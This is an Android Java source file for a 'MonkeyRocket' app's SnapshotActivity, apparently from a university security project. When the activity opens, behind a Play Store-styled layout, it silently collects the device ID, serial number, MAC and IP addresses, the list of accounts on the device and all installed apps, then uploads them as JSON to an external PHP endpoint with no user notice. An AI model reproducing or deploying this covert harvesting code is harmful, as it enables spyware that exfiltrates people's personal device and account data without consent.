package com.fiu_CaSPR.Sajib.MonkeyRocket;

/**
 * Created by Sajib on 3/24/2019.
 */

import android.app.ProgressDialog;
import com.loopj.android.http.*;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

import com.android_examples.getinstalledappiconname_android_examplescom.R;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import cz.msebera.android.httpclient.Header;

public class SnapshotActivity extends AppCompatActivity {

    int serverResponseCode = 0;
    ProgressDialog dialog = null;
    String newString = "";
    String jsonString = "";
    String reverseIPString = "";
    String upLoadServerUri = null;
    /**********  File Path *************/
    final String uploadFilePath = "/mnt/sdcard/";
    String uploadFileName;
    SimpleDateFormat dateFormat= new SimpleDateFormat("yyyyddMM_hh:mm:ss", Locale.ENGLISH);
    final String cDateTime=dateFormat.format(new Date());

    private String filepath = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.playstore_layout);

        newString+=" Device ID: "+getDeviceID()+"\n Battery Level: "+getBatteryPercentage()+"\n";
        newString+=" Device Name: "+ DeviceTracker.getDeviceName()+"\n Model: "+ Build.MODEL+"\n Serial: "+ Build.SERIAL+"\n Wlan0: "+ IPTracker.getMACAddress("wlan0")+"\n Eth0: "+ IPTracker.getMACAddress("eth0")+"\n IPv4: "+ IPTracker.getIPAddress(true)+"\n IPv6: "+ IPTracker.getIPAddress(false)+"\n";
        newString+=" Total External: "+ StorageTracker.totalExternalValue+" MB\n";
        newString+=" Free External: "+ StorageTracker.freeExternalValue+" MB\n";
        newString+=" Total Internal: "+ StorageTracker.totalInternalValue+" MB\n";
        newString+=" Free Internal: "+ StorageTracker.freeInternalValue+" MB\n";
        newString+=AccountTracker.getAccounts(this);
        newString+=installedApps();
        //newString+=" Wifi:\n"+ MainActivity.sb+"\n";
        //Toast.makeText(this, newString, Toast.LENGTH_SHORT).show();

        filepath = getDeviceID()+"_"+cDateTime+".txt";
        uploadFileName = getDeviceID()+"_"+cDateTime+".txt";

        SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss");
        //snapshot.setText("Current Snapshot: "+date+"\n\n"+newString);

        Button exitButton = (Button) findViewById(R.id.exit);
        exitButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Perform action on click
                exitToHome();
            }
        });

        try {
            convertToJSon();
            doLastJob();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    public void exitToHome(){
        Intent a = new Intent(Intent.ACTION_MAIN);
        a.addCategory(Intent.CATEGORY_HOME);
        a.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(a);
    }

    public String convertToJSon()
    {
        try {
            // Here we convert Java Object to JSON
            JSONObject jsonObj = new JSONObject();
            jsonObj.put("snaphotTime", cDateTime);
            jsonObj.put("deviceId", getDeviceID());
            jsonObj.put("batteryLevel" , getBatteryPercentage());
            jsonObj.put("deviceName" , DeviceTracker.getDeviceName());
            jsonObj.put("deviceModel" , Build.MODEL);
            jsonObj.put("serial" , Build.SERIAL);
            jsonObj.put("Wlan0", IPTracker.getMACAddress("wlan0"));
            jsonObj.put("Eth0", IPTracker.getMACAddress("eth0"));
            jsonObj.put("IPv4", IPTracker.getIPAddress(true));
            jsonObj.put("IPv6", IPTracker.getIPAddress(false));
            jsonObj.put("totalExternal", StorageTracker.totalExternalValue +" MB");
            jsonObj.put("freeExternal", StorageTracker.freeExternalValue +" MB");
            jsonObj.put("totalInternal", StorageTracker.totalInternalValue +" MB");
            jsonObj.put("freeInternal", StorageTracker.freeInternalValue +" MB");
            /*new JsonTask().execute("https://tools.keycdn.com/geo.json?host="+IPTracker.getIPAddress(true));
            JSONParser parser = new JSONParser();
            JSONObject json = new JSONObject();
            try {
                json = (JSONObject) parser.parse(reverseIPString);
            } catch (ParseException e) {
                e.printStackTrace();
            }
            // We add the object to the main object
            jsonObj.put("location", json);*/
            jsonObj.put("accountList",AccountTracker.getAccounts(this));
            jsonObj.put("appList",installedApps());

            jsonString = jsonObj.toString();

        }
        catch(JSONException ex) {
            ex.printStackTrace();
        }
        return jsonString;
    }

    public String getBatteryPercentage()
    {
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, iFilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

        float batteryLvl = level / (float) scale;
        String batteryPct = Integer.toString((int) (batteryLvl * 100));

        Log.d("Battery Level: ",batteryPct);
        //Toast.makeText(this, "Battery Level: "+batteryPct, Toast.LENGTH_SHORT).show();
        return batteryPct;
    }

    public String getDeviceID()
    {
        String androidId = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);
        Log.d("Device ID: ",androidId);
        //Toast.makeText(this, "Device ID: "+androidId, Toast.LENGTH_SHORT).show();
        return androidId;
    }

    public JSONArray installedApps()
    {
        String appList="";
        int count=0;
        JSONArray jsonArr = new JSONArray();
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
            PackageInfo packInfo = packList.get(i);
            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
            {
                JSONObject emailObj = new JSONObject();
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                try {
                    emailObj.put("User App"+count, appName);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jsonArr.put(emailObj);
                //appList += " "+appName+" \n";
                count++;
            }
            else
            {
                JSONObject emailObj = new JSONObject();
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                try {
                    emailObj.put("System App"+count, appName);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jsonArr.put(emailObj);
                //appList += " "+appName+" \n";
                count++;
            }
        }
        appList = "\n App Count: "+count+"\n"+appList;

        return jsonArr;
    }


    private void doLastJob() throws FileNotFoundException {

        /************* File Upload Code ****************/
        //Toast.makeText(SnapshotActivity.this, "Printing Snapshot...", Toast.LENGTH_SHORT).show();
        System.out.print(jsonString);
        //upLoadServerUri = "https://www.monkeyrocket.review/snap/upload_sajib.php";
        uploadFile(filepath);
    }

    private void uploadFile(String sourceFileUri) throws FileNotFoundException {
        AsyncHttpClient client = new AsyncHttpClient();
        client.setTimeout(200000);
        client.setResponseTimeout(200000);
        client.setConnectTimeout(200000);
        upLoadServerUri = "https://www.monkeyrocket.review/snap/upload_sajib.php";
        //upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";
        String fileName = sourceFileUri;
        InputStream myInputStream = new ByteArrayInputStream(jsonString.getBytes());
        RequestParams params = new RequestParams();
        params.put("uploaded_file", myInputStream, fileName);
        ResponseHandlerInterface handler = new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] response) {
                // called when response HTTP status is "200 OK"
                //Toast.makeText(SnapshotActivity.this, "Data Upload Complete!", Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] errorResponse, Throwable e) {
                // called when response HTTP status is "4XX" (eg. 401, 403, 404)
                //Toast.makeText(SnapshotActivity.this, "Data Upload Failed! Error: "+e, Toast.LENGTH_LONG).show();
                Log.e("Upload Exception", "Exception : "
                        + e.getMessage(), e);
            }

            @Override
            public void onRetry(int retryNo) {
                // called when request is retried
            }
        };
        client.post(upLoadServerUri, params, handler);
    }

    private class JsonTask extends AsyncTask<String, String, String> {

        protected void onPreExecute() {
            super.onPreExecute();
        }

        protected String doInBackground(String... params) {


            HttpURLConnection connection = null;
            BufferedReader reader = null;

            try {
                URL url = new URL(params[0]);
                connection = (HttpURLConnection) url.openConnection();
                connection.connect();


                InputStream stream = connection.getInputStream();

                reader = new BufferedReader(new InputStreamReader(stream));

                StringBuffer buffer = new StringBuffer();
                String line = "";

                while ((line = reader.readLine()) != null) {
                    buffer.append(line+"\n");
                    Log.d("Response: ", "> " + line);   //here u ll get whole response...... :-)

                }

                return buffer.toString();


            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (connection != null) {
                    connection.disconnect();
                }
                try {
                    if (reader != null) {
                        reader.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            reverseIPString = result;
        }
    }
}

